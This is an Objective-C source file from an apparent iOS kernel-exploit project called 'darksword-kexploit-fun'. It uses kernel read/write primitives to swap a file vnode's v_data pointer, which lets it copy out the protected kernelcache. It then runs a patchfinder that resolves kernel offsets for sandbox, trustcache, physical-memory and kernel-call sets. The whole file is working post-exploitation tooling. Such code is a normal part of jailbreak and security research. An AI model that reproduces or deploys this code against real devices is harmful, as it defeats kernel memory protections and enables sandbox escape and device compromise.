//
//  patchfinder.m
//  darksword-kexploit-fun
//
//  Created by seo on 3/26/26.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <xpf.h>

#import "patchfinder.h"
#import "../kexploit/krw.h"
#import "../kexploit/vnode.h"
#import "../kexploit/kutils.h"
#import "../kexploit/offsets.h"
#import "../utils/hexdump.h"

bool is_kernelcache_valid(NSString* kc) {
    NSFileHandle *handle = [NSFileHandle fileHandleForReadingAtPath:kc];
    NSData *data = [handle readDataOfLength:2];
    [handle closeFile];

    if (data.length == 2) {
        const uint8_t *bytes = data.bytes;
        if (bytes[0] == 0x30 && bytes[1] == 0x84) {
            return true;
        }
    }
    return false;
}

int grab_kernelcache(void)
{
    NSString *kc_path = [NSString stringWithFormat:@"/private/preboot/%s%@", get_bootManifestHash(), @"/System/Library/Caches/com.apple.kernelcaches/kernelcache"];
    NSString *kc_copysrc_path = @"/private/preboot/Cryptexes/OS/System/Library/CoreServices/RestoreVersion.plist";  // will temporary replaced with kernelcache data by modifying vnode->v_data
    NSString *kc_copydst_path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/kc"];
    
    unlink(kc_copydst_path.UTF8String);
    
    int kc_copysrc_fd = open(kc_copysrc_path.UTF8String, O_RDONLY);
    int kc_copydst_fd = open(kc_copydst_path.UTF8String, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    
    uint64_t kc_copysrc_vnode = get_vnode_by_fd(kc_copysrc_fd);
    uint64_t kc_copysrc_v_data = kread64(kc_copysrc_vnode + off_vnode_v_data);
    
    NSString *kc_folder_path = [NSString stringWithFormat:@"/private/preboot/%s%@", get_bootManifestHash(), @"/System/Library/Caches/com.apple.kernelcaches"];
    get_vnode_for_path_by_open(kc_path.UTF8String); // it will fail, but need to call make searchable kernelcache from vnode_get_child_vnode?
    uint64_t kc_folder_vnode = get_vnode_for_path_by_chdir(kc_folder_path.UTF8String);
    uint64_t kc_vnode = vnode_get_child_vnode(kc_folder_vnode, "kernelcache", kread64(kc_copysrc_vnode + off_vnode_v_data));
    if(kc_vnode == -1) {
        printf("Failed to find kernelcache vnode by searching child vnode\n");
        return -1;
    }
    
    uint64_t kc_v_data = kread64(kc_vnode + off_vnode_v_data);
    
    // temporary replace with kernelcache data by modifying vnode->v_data
    kwrite64(kc_copysrc_vnode + off_vnode_v_data, kc_v_data);
    
    // Copy data now!
    char buf[4096];
    ssize_t n;
    while ((n = read(kc_copysrc_fd, buf, sizeof(buf))) > 0)
        write(kc_copydst_fd, buf, n);
    
    // restore original vnode->v_data
    kwrite64(kc_copysrc_vnode + off_vnode_v_data, kc_copysrc_v_data);
    
    close(kc_copysrc_fd);
    close(kc_copydst_fd);
    
    if(is_kernelcache_valid(kc_copydst_path) == false) {
        printf("[%s:%d] Invalid kernelcache data :(\n", __FUNCTION__, __LINE__);
        hexdump_file(kc_copydst_path.UTF8String, 100);
        return -1;
    }
    
    return 0;
}

int init_xpf(void) {
    if(grab_kernelcache() != 0)  return -1;
    
    NSString *kernelcache_path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/kc"];
    
    if (xpf_start_with_kernel_path(kernelcache_path.fileSystemRepresentation) == 0) {
        printf("Starting XPF with %s (%s)\n", kernelcache_path.fileSystemRepresentation, gXPF.kernelVersionString);
        clock_t t = clock();

        printf("Kernel base: 0x%llx\n", gXPF.kernelBase);
        printf("Kernel entry: 0x%llx\n", gXPF.kernelEntry);
        //xpf_print_all_items();

        char *sets[] = {
            "translation",
            "trustcache",
            "physmap",
            "struct",
            "physrw",
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
        };

        uint32_t idx = 0;
        while (sets[idx] != NULL) idx++;

        if (xpf_set_is_supported("sandbox")) {
            sets[idx++] = "sandbox";
        }
        if (xpf_set_is_supported("perfkrw")) {
            sets[idx++] = "perfkrw";
        }
        if (xpf_set_is_supported("devmode")) {
            sets[idx++] = "devmode";
        }
        if (xpf_set_is_supported("badRecovery")) {
            sets[idx++] = "badRecovery";
        }
        if (xpf_set_is_supported("arm64kcall")) {
            sets[idx++] = "arm64kcall";
        }
        if (xpf_set_is_supported("trigon")) {
            sets[idx++] = "trigon";
        }

        xpc_object_t serializedSystemInfo = xpf_construct_offset_dictionary((const char **)sets);
        if (serializedSystemInfo) {
            xpc_dictionary_apply(serializedSystemInfo, ^bool(const char *key, xpc_object_t value) {
                if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
                return true;
            });
//            xpc_release(serializedSystemInfo);
        }
        else {
            printf("XPF Error: %s\n", xpf_get_error());
        }

        t = clock() - t;
        double time_taken = ((double)t)/CLOCKS_PER_SEC;
        printf("XPF finished in %lf seconds\n", time_taken);
        xpf_stop();
    }
    else {
        printf("Failed to start XPF: %s\n", xpf_get_error());
    }
    
    puts("done");
    
    return 0;
}
